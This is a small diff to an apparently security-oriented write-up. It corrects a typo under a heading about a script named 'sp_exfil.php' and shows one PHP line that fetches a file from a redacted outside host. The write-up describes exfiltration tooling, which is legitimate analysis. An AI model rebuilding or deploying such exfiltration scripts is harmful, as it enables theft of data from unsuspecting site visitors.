@@ -56,7 +56,7 @@ echo file_get_contents('http://REDACTED/tiny.png');
 ```
 
 ### What is in sp_exfil.php
-Well it is less elegant that the above...I don't like this one, but it is referrenced in the JavaScript.
+Well it is less elegant than the above...I don't like this one, but it is referrenced in the JavaScript.
 
 ```
 <?php
